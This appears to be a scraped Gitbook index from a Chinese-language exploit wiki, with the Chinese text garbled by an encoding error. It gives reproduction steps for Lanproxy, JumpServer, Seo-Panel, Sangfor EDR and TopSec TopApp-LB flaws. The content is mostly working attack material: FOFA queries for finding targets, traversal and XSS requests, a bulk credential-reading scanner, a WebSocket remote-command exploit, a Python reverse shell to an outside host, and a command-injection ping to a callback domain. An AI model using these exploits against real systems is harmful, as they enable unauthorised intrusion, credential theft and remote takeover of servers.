CVE-2021-3019","keywords":"","body":"Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 æ¼æ´æè¿° Lanproxyæ˜¯ä¸€ä¸ªå°†å±€åŸŸç½‘ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ä»£ç†åˆ°å…¬ç½‘çš„å†…ç½‘ç©¿é€å·¥å…·ï¼Œæ”¯æŒtcpæµé‡è½¬å‘ï¼Œå¯æ”¯æŒä»»ä½•tcpä¸Šå±‚åè®®ï¼ˆè®¿é—®å†…ç½‘ç½‘ç«™ã€æœ¬åœ°æ”¯ä»˜æ¥å£è°ƒè¯•ã€sshè®¿é—®ã€è¿œç¨‹æ¡Œé¢ç­‰ç­‰ï¼‰æœ¬æ¬¡Lanproxy è·¯å¾„éå†æ¼æ´ (CVE-2021-3019)é€šè¿‡../ç»•è¿‡è¯»å–ä»»æ„æ–‡ä»¶ã€‚è¯¥æ¼æ´å…è®¸ç›®å½•éå†è¯»å–/../conf/config.propertiesæ¥è·å–åˆ°å†…éƒ¨ç½‘è¿æ¥çš„å‡­æ®ã€‚ æ¼æ´å½±å“ [!NOTE] Lanproxy 0.1 FOFA [!NOTE] header= \"Server: LPS-0.1\" ç¯å¢ƒæ­å»º https://github.com/ffay/lanproxy/ æ¼æ´å¤ç° æ‰“å¼€ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨BurpæŠ“åŒ…å‘é€å¦‚ä¸‹è¯·æ±‚ GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close æˆåŠŸåœ¨é…ç½®æ–‡ä»¶ä¸­è¯»å– è´¦å·å¯†ç  è¯•ç€è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\"} def readConf(url): \"\"\" é»˜è®¤è¯»å–é…ç½®æ–‡ä»¶ï¼Œå¹¶é€šè¿‡èƒ½å¦è¯»å–é…ç½®æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ \"\"\" config = [ 'config.server.bind', 'config.server.port', 'config.admin.username', 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request.Request(confUrl, headers=headers) try: with request.urlopen(r, timeout=10) as resp: confContent = resp.read().decode('utf-8') for i in config: if i not in confContent: print(\"[-] \" + url + \" is not vulnerable\") return 'Bye :(' print(\"[+] \" + url + \" is vulnerable! :)\") return confContent except ConnectionResetError: print(\"[-] \" + url + \" Connection reset by peer\") except error.HTTPError as e: print(\"[-] \" + url + e.code + e.reason) except error.URLError as e: print(\"[-] \" + url + e.code + e.reason) except: print(\"[-] \" + url + \" is not vulnerable\") return 0 def readOtherFile(url, path): \"\"\" è¯»å–ä»»æ„å…¶ä»–æ–‡ä»¶ \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request.Request(fullUrl, headers=headers) with request.urlopen(r, timeout=10) as resp: fileContent = resp.read().decode('utf-8') print(fileContent) def run(url, path=\"/../conf/config.properties\"): if os.path.isfile(url) == False: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if path == \"/../conf/config.properties\": print(readConf(url)) else: if readConf(url) not in [0, 'Bye :(']: readOtherFile(url, path) else: urls = [] with open(url) as target: urls = target.read().splitlines() for url in urls: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if readConf(url) not in [0, 'Bye :(']: with open(\"success.txt\", \"a+\") as f: f.write(url + \"\\n\") f.close() def main(): parser = argparse.ArgumentParser( description=\"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\") parser.add_argument('-u', '--url', type=str, help=\"test a single website\") parser.add_argument('-r', '--read', type=str, help=\"this parameter is followed by the file name to be read, the configuration file is read by default\") parser.add_argument('-f', '--file', type=str, help=\"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\") args = parser.parse_args() if len(sys.argv) Goby & POC [!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/","title":"JumpServerå ¡å’æœº","keywords":"","body":"JumpServer å ¡å’æœº JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° JumpServer æ˜¯å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœº, ä½¿ç”¨GNU GPL v2.0 å¼€æºåè®®, æ˜¯ç¬¦åˆ4A çš„ä¸“ä¸šè¿ç»´å®¡è®¡ç³»ç»Ÿã€‚ JumpServer ä½¿ç”¨Python / Django è¿›è¡Œå¼€å‘ã€‚2021å¹´1æœˆ15æ—¥ï¼Œé˜¿é‡Œäº‘åº”æ€¥å“åº”ä¸­å¿ƒç›‘æ§åˆ°å¼€æºå ¡å’æœºJumpServerå‘å¸ƒæ›´æ–°ï¼Œä¿®å¤äº†ä¸€å¤„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ç”±äº JumpServer æŸäº›æ¥å£æœªåšæˆæƒé™åˆ¶ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚è·å–åˆ°æ—¥å¿—æ–‡ä»¶è·å–æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…æ‰§è¡Œç›¸å…³APIæ“ä½œæ§åˆ¶å…¶ä¸­æ‰€æœ‰æœºå™¨ã€‚ æ¼æ´å½±å“ [!NOTE] JumpServer JumpServer JumpServer JumpServer = v1.5.9 FOFA [!NOTE] app=\"FIT2CLOUD-JumpServer-å ¡å’æœº\" ç¯å¢ƒæ­å»º å®‰è£… JumpServer v2.6.1 ç‰ˆæœ¬ ä¸‹è½½é“¾æ¥ [!NOTE] å®‰è£…æ³¨æ„ é…ç½®ç½‘ç»œï¼Œé…ç½®Mysqlï¼Œé…ç½®Redis é€‰æ‹© n ç­‰å¾…å®Œæˆå®‰è£…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start ç­‰å¾…å®‰è£…å®Œæ¯•è®¿é—® http://xxx.xxx.xxx.xxxx:8080 é»˜è®¤è´¦å·å¯†ç  amdin:admin æ¼æ´å¤ç° è¿›å…¥åå°æ·»åŠ é…ç½® èµ„äº§ç®¡ç† --> ç³»ç»Ÿç”¨æˆ· èµ„äº§ç®¡ç† --> ç®¡ç†ç”¨æˆ· ç”¨æˆ·ç®¡ç† --> ç”¨æˆ·åˆ—è¡¨ èµ„äº§ç®¡ç† --> èµ„äº§åˆ—è¡¨ æŸ¥çœ‹ä¸€ä¸‹é¡¹ç›®ä»£ç æäº¤å˜åŠ¨ import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger(__name__) class CeleryLogWebsocket(JsonWebsocketConsumer): disconnected = False def connect(self): user = self.scope[\"user\"] if user.is_authenticated and user.is_org_admin: self.accept() else: self.close() def receive(self, text_data=None, bytes_data=None, **kwargs): data = json.loads(text_data) task_id = data.get(\"task\") if task_id: self.handle_task(task_id) def wait_util_log_path_exist(self, task_id): log_path = get_celery_task_log_path(task_id) while not self.disconnected: if not os.path.exists(log_path): self.send_json({'message': '.', 'task': task_id}) time.sleep(0.5) continue self.send_json({'message': '\\r\\n'}) try: logger.debug('Task log path: {}'.format(log_path)) task_log_f = open(log_path, 'rb') return task_log_f except OSError: return None def read_log_file(self, task_id): task_log_f = self.wait_util_log_path_exist(task_id) if not task_log_f: logger.debug('Task log file is None: {}'.format(task_id)) return task_end_mark = [] while not self.disconnected: data = task_log_f.read(4096) if data: data = data.replace(b'\\n', b'\\r\\n') self.send_json( {'message': data.decode(errors='ignore'), 'task': task_id} ) if data.find(b'succeeded in') != -1: task_end_mark.append(1) if data.find(bytes(task_id, 'utf8')) != -1: task_end_mark.append(1) elif len(task_end_mark) == 2: logger.debug('Task log end: {}'.format(task_id)) break time.sleep(0.2) task_log_f.close() def handle_task(self, task_id): logger.info(\"Task id: {}\".format(task_id)) thread = threading.Thread(target=self.read_log_file, args=(task_id,)) thread.start() def disconnect(self, close_code): self.disconnected = True self.close() æ–°ç‰ˆå¯¹ç”¨æˆ·è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¯ä»¥ä½¿ç”¨ è°·æ­Œæ’ä»¶ WebSocket King è¿æ¥ä¸Šè¿™ä¸ªwebsocket è¿›è¡Œæ—¥å¿—è¯»å– æ¯”å¦‚sendè¿™é‡Œè·å–çš„ Task id ,è¿™é‡Œæ˜¯å¯ä»¥è·å¾—ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯çš„ æŸ¥çœ‹ä¸€ä¸‹è¿æ¥Webç»ˆç«¯çš„åç«¯apiä»£ç  å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨æ—¶å¿…é¡»éœ€è¦ user asset system_user è¿™ä¸‰ä¸ªå€¼ï¼Œå†è·å–ä¸€ä¸ª20ç§’çš„ token è®¿é—®webç»ˆç«¯åæŸ¥çœ‹æ—¥å¿—çš„è°ƒç”¨ docker exec -it (jumpserve/coreçš„docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 å¯ä»¥çœ‹åˆ°åœ¨ä¸åŒçš„æ—¶é—´è®¿é—®è¿™ä¸ªæ¥å£çš„asset_idç­‰éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªç”¨åœ¨ åˆšåˆšçš„æœªæˆæƒæ—¥å¿—è¯»å–é‡Œæ‰¾åˆ°æƒ³è¦çš„è¿™å‡ ä¸ªå€¼å°±å¯ä»¥è·å¾— token å‘é€è¯·æ±‚è·å–20sçš„token çœ‹ä¸€ä¸‹ koko.js è¿™ä¸ªå‰ç«¯æ–‡ä»¶ åç«¯ä»£ç  https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ è·å¾—çš„tokenæ¥æ¨¡æ‹Ÿè¯·æ±‚ æˆåŠŸè¿æ¥æ¨¡æ‹Ÿäº†è¿™ä¸ª token çš„è¯·æ±‚,å¯ä»¥åœ¨Networkçœ‹ä¸€ä¸‹æµé‡æ˜¯æ€ä¹ˆå‘é€çš„ æ¨¡æ‹Ÿè¿æ¥å‘é€å’Œæ¥å‘æ•°æ® è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªè¦æ¨¡æ‹Ÿäº†è¿™ä¸ªå‘é€ï¼Œè¿”å›çš„æ•°æ®å’Œwebç»ˆç«¯æ˜¯ä¸€æ ·çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™æ ·çš„æ–¹æ³•æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº† æ¼æ´åˆ©ç”¨POC [!NOTE] POC é‡ŒåŒ…å«ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è·å–æ—¥å¿—æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œ æ—¥å¿—æå–å·²ç»è¿‡æ»¤äº†éƒ¨åˆ†APIè°ƒç”¨çš„æ•°æ®ï¼Œåªéœ€è¦æ‰¾åˆ°é‚£å‡ ä¸ªå€¼å°±å¥½äº† å‘½ä»¤æ‰§è¡Œéœ€è¦ä»æ—¥å¿—ä¸­è·å–æ•æ„Ÿæ•°æ®å¹¶å†™å…¥è„šæœ¬å¯¹åº”çš„å˜é‡ä¸­ æ¥æ”¶æ•°æ®å¦‚æœå¡ä½è¯·è°ƒæ•´ for i in range(7) è¿™ä¸ªä½ç½®çš„ 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mPOC_Des: https://www.o2oxy.cn/ \\033[0m') print('+ \\033[34mVersion: JumpServer >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') class ws_long(WebSocketClient): def opened(self): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) # print(resp) data = resp['message'] if \"/api/v1/perms/asset-permissions/user/validate/?\" in data: print(data) async def send_msg(websocket, _text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) async def main_logic(target_url): print(\"\\033[32m[o] æ­£åœ¨è¿æ¥ç›®æ ‡: {}\\033[0m\".format(target_url)) async with websockets.connect(target_url) as websocket: recv_text = await websocket.recv() resws = json.loads(recv_text) id = resws['id'] print(\"\\033[36m[o] æˆåŠŸè·å– ID: {}\\033[0m\".format(id)) inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket, inittext) for i in range(7): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) while True: cmd = str(input(\"\\033[35mcmd >>> \\033[0m\")) cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd + \"\\r\\n\"}) await send_msg(websocket, cmdtext) for i in range(1): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) def POC_1(target_url): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests.get(url=vuln_url, timeout=5) if response.status_code == 401 or response.status_code == 403 or response.status_code == 404: print(\"\\033[32m[o] ç›®æ ‡ {} JumpServerå ¡å’æœºä¸ºæœªä¿®å¤æ¼æ´ç‰ˆæœ¬ï¼Œè¯·é€šè¿‡æ—¥å¿—è·å–å…³é”®å‚æ•°\\033[0m\".format(target_url)) ws_open = str(input(\"\\033[32m[o] æ˜¯å¦æƒ³è¦æå–æ—¥å¿—ï¼ˆY/Nï¼‰ >>> \\033[0m\")) if ws_open == \"Y\" or ws_open == \"y\": ws = target_url.strip(\"http://\") try: ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws)) ws.connect() ws.run_forever() ws.close() except KeyboardInterrupt: ws.close() else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´å·²ä¿®å¤ï¼Œæ— æ³•è·å–æ•æ„Ÿæ—¥å¿—ä¿¡æ¯\\033[0m\") sys.exit(0) def POC_2(target_url, user, asset, system_user): if target_url == \"\" or asset == \"\" or system_user == \"\": print(\"\\033[31m[x] è¯·è·å– assset ç­‰å‚æ•°é…ç½®\\033[0m\") sys.exit(0) data = {\"user\": user, \"asset\": asset, \"system_user\": system_user} vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try: response = requests.post(vuln_url, json=data, timeout=5).json() print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ï¼š{}\\033[0m\".format(vuln_url)) token = response['token'] print(\"\\033[36m[o] æˆåŠŸè·å–Tokenï¼š{}\\033[0m\".format(token)) ws_url = target_url.strip(\"http://\") ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id={}\".format(token) asyncio.get_event_loop().run_until_complete(main_logic(ws_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥ assset ç­‰å‚æ•°é…ç½®,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) user = \"7c30bef8-61e2-4644-bf90-f7cacd1936f8\" asset = \"2bb3df36-8e63-4ace-9f8f-c77e95ffc549\" system_user = \"abd00340-e9ba-40af-a432-9a85f867b6bb\" POC_1(target_url) POC_2(target_url, user, asset, system_user) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/","title":"Seo-Panel","keywords":"","body":"Seo-Panel Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Seo-Panel/Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002.html","title":"Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´  CVE-2021-3002","keywords":"","body":"Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 æ¼æ´æè¿° Seo Panelæ˜¯ä¸€ä¸ªç½‘ç«™æœç´¢å¼•æ“ä¼˜åŒ–ç®¡ç†çš„å®Œæ•´æ§åˆ¶é¢æ¿ã€‚å®ƒåŒ…å«äº†å¤šä¸ªSEOå·¥å…·æ¥å¢åŠ å’Œè·Ÿè¸ªä½ çš„ç½‘ç«™æ€§èƒ½ Seo-Panel 4.8.0ä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨è¿‡æ»¤ä¸å®Œå…¨çš„æƒ…å†µï¼Œé€ æˆå­˜åœ¨ åå°„å‹XSSæ¼æ´ æ¼æ´å½±å“ [!NOTE] Seo-Panel Version ç¯å¢ƒæ­å»º https://github.com/seopanel/Seo-Panel ä¸‹è½½åæ”¾å…¥ç½‘ç«™æ ¹ç›®å½•æ ¹æ®æç¤ºå®‰è£…è®¿é—®å³å¯ æ¼æ´å¤ç° æ¼æ´å‡ºç°åœ¨æ‰¾å›å¯†ç é¡µé¢ http://xxx.xxx.xxx.xxx/login.php?sec=forgot æˆåŠŸå¼¹çª— ,é€ æˆ åå°„å‹XSS æ¼æ´ æ¼æ´POC è¯·æ±‚åŒ…å¦‚ä¸‹ POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass&email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak&code=12345&login= WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/","title":"æ·±ä¿¡æœ","keywords":"","body":"æ·±ä¿¡æœ æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552.html","title":"æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552","keywords":"","body":"æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 æ¼æ´æè¿° æ·±ä¿¡æœç»ˆç«¯æ£€æµ‹å“åº”å¹³å°æ˜¯æ·±ä¿¡æœå…¬å¸å¼€å‘çš„ä¸€å¥—EDRç³»ç»Ÿã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€æ¶æ„æ„é€ çš„HTTPè¯·æ±‚ï¼Œä»è€Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™ï¼Œå®ç°è¿œç¨‹ä»£ç æ§åˆ¶æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 æ¼æ´å¤ç° https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami åå¼¹shell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' å‘ /tool/log/c.php POSTä»¥ä¸‹æ•°æ®å³å¯ strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/","title":"å¤©èä¿¡","keywords":"","body":"å¤©èä¿¡ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB ä»»æ„ç™»é™† å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB å‘½ä»¤æ‰§è¡Œæ¼æ´ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™† æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBç³»ç»Ÿæ— éœ€å¯†ç å¯ç›´æ¥ç™»é™†ï¼ŒæŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° åœ¨ç™»å½•é¡µé¢ä¸­è¾“å…¥ï¼Œè´¦å·:ä»»æ„è´¦å· å¯†ç :;id æˆåŠŸç™»å½• WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBç³»ç»Ÿå­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•ç•Œé¢ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œ è´¦å·:1;ping 6km5dk.ceye.io;echo å¯†ç :ä»»æ„ æˆåŠŸæ”¶åˆ°è¯·æ±‚ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by 